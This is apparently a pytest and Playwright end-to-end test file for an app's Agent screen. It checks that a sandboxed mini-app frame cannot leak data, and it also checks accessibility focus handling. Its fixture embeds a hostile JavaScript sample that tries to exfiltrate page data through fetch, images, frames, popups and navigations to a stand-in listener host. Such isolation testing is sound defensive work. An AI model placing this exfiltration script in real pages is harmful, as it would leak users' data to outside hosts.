"""Mini-app frame isolation on the Agent screen (spec agent-panel-code-mode, G7 and Phase 5) against the running app.

The exploration and its mini-app HTML are seeded straight into the stack's store (no model call, no sandbox run).
The mini-app tries every way out it has: fetch, an image, a child frame, a popup, a top-level link and, last, a
navigation of its own frame, to the app's own API and to another host (the last one per run, so twice). No request may leave either
frame, and only its one `ask` message may reach the screen."""

import json
import os
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

from arp.agent.explorations import ExplorationStore

URL = os.environ.get("ARP_E2E_URL")
API = os.environ.get("ARP_E2E_API_URL", "http://localhost:8000")  # the stack's API (e2e_stack.sh)
LOGS = [Path(os.environ.get("TMPDIR", "/tmp")) / "arp-e2e" / name for name in ("api.log", "web.log")]  # e2e_stack.sh's
DSN = os.environ.get("ARP_POSTGRES_DSN", "postgresql+psycopg://arp:arp@localhost:5432/arp_test")  # e2e_stack.sh's default
pytestmark = [
    pytest.mark.e2e,
    pytest.mark.skipif(not URL, reason="ARP_E2E_URL not set -- start backend/scripts/e2e_stack.sh"),
]

MINIAPP = """<p id="out">loading</p><script>
var targets = TARGETS, d = encodeURIComponent(JSON.stringify(window.ARP_DATA));
fetch(targets[0]).then(function () { parent.postMessage({action: "ask", text: "fetch reached the API"}, "*"); },
  function () {
    parent.postMessage({action: "run", plan_id: "x"}, "*");
    parent.postMessage({action: "ask", text: "why sector X? fetch failed"}, "*");
    targets.forEach(function (t, n) {
      var img = document.createElement("img"); img.src = t + "?img=" + d; document.body.append(img);
      var f = document.createElement("iframe"); f.src = t + "?frame=" + d; document.body.append(f);
      try { window.open(t + "?open=" + d); } catch (e) {}
      var a = document.createElement("a"); a.href = t + "?top=" + d; a.target = "_top"; document.body.append(a); a.click();
      try { parent.location.href = t + "?parent=" + d; } catch (e) {}
    });
    setTimeout(function () { location.href = SELF + "?self=" + d; }, 100);  // last: it ends this page if it goes
  });
</script>"""


@pytest.fixture
def page():
    from playwright.sync_api import sync_playwright

    from arp.config import Settings

    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=Settings().chromium_path)
        page = browser.new_page(viewport={"width": 1400, "height": 900})
        yield page
        browser.close()


@pytest.fixture(scope="module")
def listener():
    """Another host: records every request that reaches it."""
    hits = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            self.send_response(204)
            self.end_headers()

        def log_message(self, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{server.server_port}/leak", hits
    server.shutdown()


@pytest.fixture(params=["api", "other host"], ids=["self-nav to the app's API", "self-nav to another host"])
def exploration(request, listener):
    targets = [f"{API}/api/plans", "/api/plans", listener[0]]  # the app's API, the app's own origin, another host
    store = ExplorationStore(DSN)
    row = store.add(question="miniapp isolation e2e", code="return []", model="stand-in",
                    run={"status": "done", "result": [{"holding": "secret-co", "weight": 0.3}], "error": None, "tool_calls": []})
    store.set_miniapp(row["id"], MINIAPP.replace("TARGETS", json.dumps(targets)).replace(
        "SELF", json.dumps(targets[0] if request.param == "api" else targets[2])))
    return row["id"]


def test_miniapp_reaches_nothing_and_only_fills_the_composer(page, exploration, listener):
    seen = {log: log.stat().st_size for log in LOGS}  # the stack's access logs, read from here on
    popups = []
    page.context.on("page", lambda p: popups.append(p.url))
    page.goto(f"{URL}/#/agent/exploration/{exploration}")
    page.get_by_role("tab", name="Mini-app").first.click()
    composer = page.locator("#agent-brief")
    composer.wait_for()
    page.wait_for_function("document.querySelector('#agent-brief').value.includes('fetch failed')", timeout=10_000)
    time.sleep(2)  # the navigations run after the message; give each the time a request would take to start

    assert composer.input_value() == "why sector X? fetch failed"  # the ask landed, the run message did nothing
    assert listener[1] == []  # nothing reached the other host
    for log, start in seen.items():  # nor the app: every attempt carries the data, "secret-co" among it
        with log.open("rb") as f:
            f.seek(start)
            assert b"secret-co" not in f.read(), log.name
    assert popups == []
    assert page.url.startswith(URL) and "/agent/exploration/" in page.url  # the app page was not navigated
    assert page.frame_locator("iframe.agent-miniapp").locator("iframe").count() == 1  # the shell still holds the mini-app


@pytest.fixture
def plain():
    """A done exploration without a mini-app yet."""
    return ExplorationStore(DSN).add(question="miniapp focus e2e", code="return []", model="stand-in",
                                     run={"status": "done", "result": [{"a": 1}], "error": None, "tool_calls": []})["id"]


def _answer_miniapp(page, exploration, ok):
    """The stack has no model: the route's answer is stored here, as the real route would, or it fails with 502."""
    def handle(route):
        if not ok:
            return route.fulfill(status=502, json={"detail": "no mini-app was written: test"})
        row = ExplorationStore(DSN).set_miniapp(exploration, "<p>hi</p>")
        route.fulfill(status=200, content_type="application/json", body=json.dumps(row, default=str))
    page.route(f"**/api/agent/explorations/{exploration}/miniapp", handle)


@pytest.mark.parametrize("width", [1400, 390])
def test_show_as_miniapp_moves_focus_to_the_selected_miniapp_tab(page, plain, width):  # WCAG 2.4.3
    page.set_viewport_size({"width": width, "height": 900})
    _answer_miniapp(page, plain, ok=True)
    page.goto(f"{URL}/#/agent/exploration/{plain}")
    page.locator("#agent-show-miniapp").focus()
    page.keyboard.press("Enter")
    page.wait_for_function("document.activeElement && document.activeElement.dataset.tab === 'miniapp'", timeout=10_000)
    focused = page.evaluate("""() => { const e = document.activeElement;
        return {selected: e.getAttribute('aria-selected'), visible: !!e.offsetParent, inDrawer: !!e.closest('#agent-drawer')}; }""")
    assert focused == {"selected": "true", "visible": True, "inDrawer": width < 900}
    shown = page.frame_locator("dialog iframe.agent-miniapp" if width < 900 else ".agent-stage iframe.agent-miniapp")
    shown.frame_locator("iframe").locator("p").wait_for()  # the stored page shows in the stage that has focus


def test_closing_the_drawer_show_as_miniapp_opened_returns_focus_to_the_button(page, plain):  # WCAG 2.4.3, below 900 px
    page.set_viewport_size({"width": 390, "height": 844})
    _answer_miniapp(page, plain, ok=True)
    page.goto(f"{URL}/#/agent/exploration/{plain}")
    page.locator("#agent-show-miniapp").focus()
    page.keyboard.press("Enter")
    page.wait_for_function("document.activeElement && document.activeElement.dataset.tab === 'miniapp'", timeout=10_000)
    page.keyboard.press("Escape")
    page.wait_for_function("!document.querySelector('#agent-drawer')", timeout=5_000)
    assert page.evaluate("document.activeElement.id") == "agent-show-miniapp"


def test_a_failed_show_as_miniapp_returns_focus_to_the_button(page, plain):
    _answer_miniapp(page, plain, ok=False)
    page.goto(f"{URL}/#/agent/exploration/{plain}")
    page.locator("#agent-show-miniapp").focus()
    page.keyboard.press("Enter")
    page.get_by_role("alert").wait_for()
    page.wait_for_function("document.activeElement && document.activeElement.id === 'agent-show-miniapp'", timeout=10_000)
